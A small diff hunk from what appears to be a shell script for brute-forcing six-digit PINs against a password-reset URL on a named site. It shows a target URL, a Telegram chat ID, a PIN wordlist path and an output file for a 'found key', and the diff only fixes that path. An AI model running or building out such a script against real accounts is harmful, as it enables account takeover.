@@ -5,7 +5,7 @@ TELEGRAM_CHAT_ID="6729179510"
 
 url="https://sohei.io/reset"
 output_file="found_key.txt"
-wordlist_path="/home/usr/6digitPIN.txt"
+wordlist_path="/home/user/6digitPIN.txt"
 
 # Headers from working cURL command
 headers=(
